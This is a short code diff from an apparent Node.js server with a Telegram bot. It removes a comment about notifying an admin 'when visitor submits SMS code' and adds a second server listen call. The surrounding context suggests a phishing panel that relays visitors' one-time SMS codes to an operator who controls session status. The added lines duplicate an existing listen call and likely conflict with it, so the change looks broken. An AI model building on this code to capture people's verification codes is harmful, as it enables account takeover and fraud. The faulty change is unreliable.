@@ -108,7 +108,7 @@ bot.on('callback_query', async (query) => {
   console.log(`[Session ${sessionId}] Status → ${action}`);
 });
 
-// When visitor submits SMS code — notify admin
+
 async function notifySMSCode(session, code, codeType) {
   const text =
 
@@ -231,6 +231,10 @@ app.get('*', (req, res) => {
   });
 });
 
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, '0.0.0.0', () => {
+    console.log(`Server is running on port ${PORT}`);
+});
 
 app.listen(PORT, () => {
   console.log(`
